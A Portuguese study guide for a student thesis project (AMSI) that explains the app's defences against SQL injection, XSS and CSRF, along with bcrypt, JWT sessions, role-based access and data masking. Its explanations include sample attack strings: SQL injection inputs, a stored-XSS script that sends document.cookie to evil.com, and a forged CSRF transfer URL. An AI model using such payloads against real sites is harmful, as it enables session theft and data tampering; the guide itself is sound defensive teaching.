# Temático: Segurança — TCC AMSI
## Deep dive completo em segurança para estudo focado no NotebookLM

> **Como usar:** sobe apenas este arquivo no NotebookLM para estudar segurança isoladamente. Pergunte ao NotebookLM: "Explique como o AMSI protege contra SQL Injection" e compare com o que você sabe.

---

## 1. SQL INJECTION

### O que é
SQL Injection ocorre quando dados fornecidos pelo usuário são interpolados diretamente em uma query SQL, permitindo que um atacante altere a lógica da query.

Exemplo de código vulnerável (NÃO existe no projeto):
```python
# VULNERÁVEL
cursor.execute(f"SELECT * FROM usuario WHERE email = '{email}'")
# Se email = "' OR '1'='1", a query retorna todos os usuários
```

### Como o AMSI se protege

**Camada 1 — Pydantic (antes do banco):**
Cada campo de entrada é tipado. Um campo `id: int` rejeita automaticamente a string `"1; DROP TABLE"` com erro HTTP 422 antes de qualquer query acontecer.

**Camada 2 — SQLAlchemy ORM (queries parametrizadas):**
O ORM nunca interpola valores na string SQL. Internamente, gera:
```sql
SELECT * FROM lancamento WHERE id_lancamento = $1
-- o valor vai como parâmetro separado, não concatenado
```
O driver PostgreSQL trata o valor como dado, não como parte da query. Um valor `"1; DROP TABLE lancamento"` seria tratado como uma string literal que simplesmente não corresponde a nenhum ID.

**Arquivos relevantes:** `backend/models/*.py`, `backend/routes/*.py`, `backend/schemas/*.py`

### O que poderia ser melhor
SQL puro via `db.execute()` ainda seria vulnerável se o código concatenasse strings. O projeto não faz isso, mas não há linting automático para prevenir que alguém introduza a vulnerabilidade no futuro.

---

## 2. XSS — CROSS-SITE SCRIPTING

### O que é
XSS ocorre quando o browser executa como JavaScript ou HTML conteúdo que veio do banco de dados (enviado por um atacante). Existem dois tipos principais:
- **Stored XSS:** o atacante salva `<script>document.cookie</script>` no banco; toda vez que outro usuário vê esse dado, o script executa.
- **Reflected XSS:** um link malicioso injeta código que o servidor reflete de volta na resposta.

### Como o AMSI se protege

**React usa `textContent`, não `innerHTML`:**
JSX `{nome}` compila para `React.createElement()` que internamente usa `node.textContent = valor`. A API DOM `textContent` trata qualquer valor como texto puro — os caracteres `<` e `>` são convertidos para entidades HTML `&lt;` e `&gt;`, exibidos como texto na tela, nunca interpretados como tags.

**Nenhum uso de `dangerouslySetInnerHTML`:**
A única forma de contornar a proteção do React é explicitamente usar `dangerouslySetInnerHTML={{ __html: conteudo }}`. O projeto não usa essa prop em nenhum componente. Isso foi verificado explicitamente.

**Exemplo:**
Se um atacante salvar o nome `<script>fetch('https://evil.com?c='+document.cookie)</script>` em um clifor, o React renderizará literalmente essa string de texto na tela — o script nunca executará.

**Arquivos relevantes:** `AMSI_Frontend/src/components/*.jsx`, `AMSI_Frontend/src/pages/*.jsx`

### O que poderia ser melhor
O backend não sanitiza HTML nos campos de texto. Se o projeto fosse migrar para renderização server-side (SSR) ou se houvesse algum componente que eventualmente usasse `dangerouslySetInnerHTML`, o conteúdo do banco poderia causar XSS. Para maior defesa em profundidade, campos de texto no backend poderiam passar por sanitização com `bleach`.

---

## 3. CSRF — CROSS-SITE REQUEST FORGERY

### O que é
CSRF ocorre quando um site malicioso faz o browser da vítima enviar uma requisição para outro site onde a vítima está autenticada. O ataque funciona porque o browser envia cookies automaticamente para o domínio de destino.

Exemplo: a vítima está logada em `banco.com` (autenticação por cookie). Um site malicioso `evil.com` tem uma imagem com `src="https://banco.com/transferir?valor=1000&destino=atacante"`. O browser da vítima ao carregar a página faz a requisição GET com o cookie do banco.

### Por que o AMSI não é vulnerável

**Autenticação por header, não por cookie:**
O frontend armazena o JWT no `localStorage` e o envia no header:
```
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

Headers personalizados não são enviados automaticamente pelo browser para nenhum domínio. Um site malicioso `evil.com` pode fazer o browser da vítima requisitar `amsi.com`, mas não pode incluir o header `Authorization` — ele fica no `localStorage` do domínio `amsi.com`, inacessível para `evil.com` por política de mesmo-origem.

**CORS como segunda linha:**
O CORS no backend (`main.py`) define quais origens podem fazer requisições. Em produção, seria `allow_origins=["https://amsi-frontend.vercel.app"]` — requisições de outras origens são bloqueadas pelo browser.

**Arquivos relevantes:** `backend/main.py` (configuração CORS), `AMSI_Frontend/src/services/api.js` (header Authorization)

### Aviso: CORS em desenvolvimento
O backend em desenvolvimento usa `allow_origins=["*"]`. Isso é aceitável durante desenvolvimento local onde não há usuários reais. Em produção, `"*"` seria um risco — qualquer site poderia fazer requisições para o backend. A configuração de produção correta está documentada em `docs/09_seguranca.md`.

---

## 4. BCRYPT E PROTEÇÃO DE SENHAS

### Por que não MD5 ou SHA-256

Algoritmos de hash de propósito geral (MD5, SHA-1, SHA-256) são projetados para ser rápidos. Uma GPU RTX 4090 consegue:
- **MD5:** 164 bilhões de hashes por segundo
- **SHA-256:** 22 bilhões de hashes por segundo
- **bcrypt (cost 12):** ~4.000 hashes por segundo

Para um atacante com o banco de dados de senhas hasheadas, a velocidade do algoritmo determina quantas tentativas por segundo ele pode fazer. Com SHA-256, testar um dicionário de 10 bilhões de senhas comuns levaria menos de 1 segundo. Com bcrypt cost 12, levaria ~694 anos.

### Como o AMSI usa bcrypt

```python
# backend/utils/auth_utils.py
from passlib.context import CryptContext
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def hash_senha(senha: str) -> str:
    return pwd_context.hash(senha)  # inclui salt automático

def verificar_senha(senha: str, hash: str) -> bool:
    return pwd_context.verify(senha, hash)  # comparação em tempo constante
```

**Salt automático:** cada chamada a `hash()` gera um salt aleatório diferente, mesmo para senhas idênticas. Resultado: dois usuários com a mesma senha têm hashes completamente diferentes. Tabelas rainbow (listas pré-computadas de hash → senha) são inúteis porque o salt está embutido no hash e é único por usuário.

**Comparação em tempo constante:** `verify()` leva o mesmo tempo independente de quantos caracteres do hash conferem. Isso previne timing attacks: um atacante não pode inferir caracteres corretos medindo microsegundos de diferença na resposta.

**Cost factor 12:** o número de rounds de processamento. Pode ser aumentado no futuro sem invalidar senhas antigas (o cost factor fica embutido no hash).

---

## 5. JWT HÍBRIDO — AUTENTICAÇÃO E SESSÃO

### Estrutura do JWT

Um JWT tem três partes separadas por ponto (`.`), todas em Base64:
```
HEADER.PAYLOAD.SIGNATURE
```

**Header:** algoritmo de assinatura (`HS256` no projeto)
**Payload:** dados não sensíveis
```json
{
  "sub": "42",
  "perfil": "Operador",
  "jti": "c3d4e5f6-...",
  "exp": 1748000000
}
```
**Assinatura:** `HMAC_SHA256(HEADER + "." + PAYLOAD, SECRET_KEY)` — garante integridade

**Importante:** o payload não é criptografado — é só Base64. Qualquer um pode decodificá-lo. O que o JWT garante é **integridade**: sem a `SECRET_KEY`, não é possível falsificar a assinatura.

### Por que o projeto usa a tabela `token_ativo`

JWT puro não tem logout. O token é válido até `exp` independente de o usuário ter clicado em "sair". Para logout real, o projeto usa uma tabela:

```
token_ativo (jti, id_usuario_fk, expires_at)
```

**Fluxo de login:**
1. Usuário envia email/senha
2. Backend valida com bcrypt
3. Backend gera JWT com `jti` único (UUID)
4. Salva o `jti` em `token_ativo`
5. Devolve o token para o frontend

**Fluxo de requisição autenticada:**
1. Frontend envia `Authorization: Bearer <token>`
2. Backend valida assinatura JWT
3. Backend busca `jti` em `token_ativo` — se não encontrar → 401
4. Verifica expiração

**Fluxo de logout:**
1. Backend deleta o registro `token_ativo` com o `jti` do token atual
2. O token JWT pode ser sintaticamente válido, mas sem o registro no banco → 401

**Arquivos relevantes:** `backend/auth/router.py`, `backend/auth/dependencies.py`, `backend/models/token_ativo.py`

---

## 6. RBAC — CONTROLE DE ACESSO BASEADO EM PERFIS

### O que é RBAC
Role-Based Access Control: permissões são atribuídas a papéis (roles), não diretamente a usuários. Um usuário tem um papel; o papel define o que pode fazer.

### Os três perfis do AMSI

| Perfil | Lançamentos | Clifors | Usuários | Dashboard |
|---|---|---|---|---|
| Consulta | Ver | Ver (CPF mascarado) | Não | Ver |
| Operador | Criar, Efetivar | Ver, Criar, Editar | Não | Ver |
| Administrador | Tudo | Tudo | Tudo | Ver |

### Como é implementado no backend

```python
# backend/auth/dependencies.py
def exige_admin(usuario = Depends(get_current_user)):
    if usuario.perfil != PerfilEnum.Administrador:
        raise HTTPException(status_code=403, detail="Acesso restrito a Administradores")
    return usuario

def exige_operador_ou_admin(usuario = Depends(get_current_user)):
    if usuario.perfil not in [PerfilEnum.Operador, PerfilEnum.Administrador]:
        raise HTTPException(status_code=403)
    return usuario
```

Cada rota declara qual guarda precisa passar:
```python
@router.post("/", response_model=LancamentoResponse)
def criar_lancamento(
    dados: LancamentoCreate,
    db: Session = Depends(get_db),
    _=Depends(exige_operador_ou_admin)  # ← guarda de permissão
):
```

**O perfil vem do banco, não do token.** `get_current_user()` lê o `id` do token, busca o usuário no banco, e retorna o objeto com perfil atualizado. Mesmo que o frontend modifique o `localStorage`, o backend usa o perfil real do banco.

### Como é implementado no frontend

`PrivateRoute` verifica autenticação (token presente):
```jsx
// AMSI_Frontend/src/components/PrivateRoute.jsx
if (!token) return <Navigate to="/login" />;
```

`AdminRoute` verifica perfil:
```jsx
// AMSI_Frontend/src/components/AdminRoute.jsx
const perfil = getUserFromToken(token)?.perfil;
if (perfil !== "Administrador") return <Navigate to="/" />;
```

**Importante:** o frontend esconde botões e rotas, mas a proteção real está no backend. Se um usuário Consulta manipular o frontend para ver o botão "Criar lançamento" e clicar, o backend retorna 403. A UI é apenas conveniência.

---

## 7. MASCARAMENTO DE CPF/CNPJ

### O problema
CPF e CNPJ são dados pessoais sensíveis. Um usuário com perfil Consulta não deve ver esses dados de outros associados.

### A solução
O dado é armazenado sem criptografia no banco (limitação reconhecida), mas protegido na exibição.

**Mascaramento padrão:**
A função `mascaraCpfCnpj()` no frontend converte `"12345678901"` para `"•••.•••.•••-••"` antes de exibir.

**Click-to-reveal apenas para Operador/Admin:**
O perfil Consulta nunca vê o valor real. Para Operador e Admin, é possível clicar no valor mascarado para revelar temporariamente.

**Arquivos relevantes:** `AMSI_Frontend/src/pages/ListaLancamentosPage.jsx`, `docs/08_padroes_nao_obvios.md` seção 5

### O que seria melhor em produção
Criptografia em repouso: armazenar o CPF criptografado com uma chave simétrica separada do banco. A descriptografia aconteceria apenas para usuários com permissão, no backend, e o valor plaintext nunca persistiria em logs.

---

## 8. LOG DE SESSÕES E AUDITORIA

### O que é registrado
A tabela `login` (`backend/models/login.py`) registra cada evento de login com:
- ID do usuário
- Timestamp
- IP de origem
- User-agent (dispositivo/browser)

Isso permite, retrospectivamente, identificar se um token roubado foi usado de um IP diferente do padrão do usuário.

### O que não é registrado (limitação)
- Quais dados foram consultados (não há log de leituras)
- Mudanças campo por campo em um lançamento (apenas "quem criou" e "quando", não "o que mudou")

Para auditoria financeira completa, um sistema de produção deveria ter uma tabela de audit trail que registre cada UPDATE com o valor anterior e o novo.

---

## RESUMO: AS 4 PROTEÇÕES PRINCIPAIS

| Ameaça | Proteção no AMSI | Onde está |
|---|---|---|
| SQL Injection | SQLAlchemy ORM + Pydantic | `backend/models/`, `backend/schemas/` |
| XSS | React `textContent` (sem `dangerouslySetInnerHTML`) | `AMSI_Frontend/src/components/` |
| CSRF | Header `Authorization` (não cookie) | `AMSI_Frontend/src/services/api.js` |
| Senha fraca/rainbow | bcrypt cost 12 + salt automático | `backend/utils/auth_utils.py` |

---

## PONTOS DE MELHORIA RECONHECIDOS (para a banca)

1. **Sem rate limiting** no `/auth/token` — adicionar `slowapi`
2. **CPF/CNPJ em texto no banco** — criptografar em repouso
3. **CORS aberto em desenvolvimento** — restringir em produção
4. **JWT em `localStorage`** — vulnerável a XSS (mitigado pela proteção React, mas não eliminado)
5. **Sem 2FA** — adicionar TOTP com `pyotp` seria o próximo passo de segurança
